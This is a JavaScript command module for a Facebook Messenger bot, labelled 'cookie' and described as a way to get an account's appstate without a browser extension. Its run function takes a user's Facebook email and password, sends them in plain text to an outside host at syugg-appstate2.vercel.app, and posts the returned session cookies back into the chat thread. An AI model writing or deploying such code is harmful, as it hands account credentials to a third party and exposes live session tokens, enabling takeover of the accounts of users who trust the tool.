const axios = require('axios');

module.exports.config = {
  name: "cookie",
  version: "1.0",
  hasPrefix: false,
  role: 0,
  description: "get your appstate without extension",
  credits: "Cliff",
  aliases: ["fbstate","appstate"], 
  cooldown: 0,
  usages: "[pn] email and password",
};

module.exports.run = async function ({ api, event, args }) {

  if (args.length !== 2) {
    return api.sendMessage("Please provide email and password.\n\nexample: appstateget [email] [password]", event.threadID, event.messageID);
  }

  const [email, password] = args.map(arg => arg.trim());

  api.setMessageReaction("⏳", event.messageID, () => {}, true);
  const cliff = await new Promise(resolve => {
        api.sendMessage("⏳ Getting your appstate/cookie, please wait...", event.threadID, (err, info1) => {
        resolve(info1);
       }, event.messageID);
      });

  try {
    const response = await axios.get(`https://syugg-appstate2.vercel.app/loginn?email=${email}&password=${password}`);
    const Userdata = response.data.cookies;

    api.setMessageReaction("✅", event.messageID, () => {}, true);

     api.editMessage(Userdata, cliff.messageID);
  } catch (error) {
    console.error("error", error);
    api.sendMessage("error bai, change password ka muna tapos subukan mo ulit.", event.threadID, event.messageID);
  }
}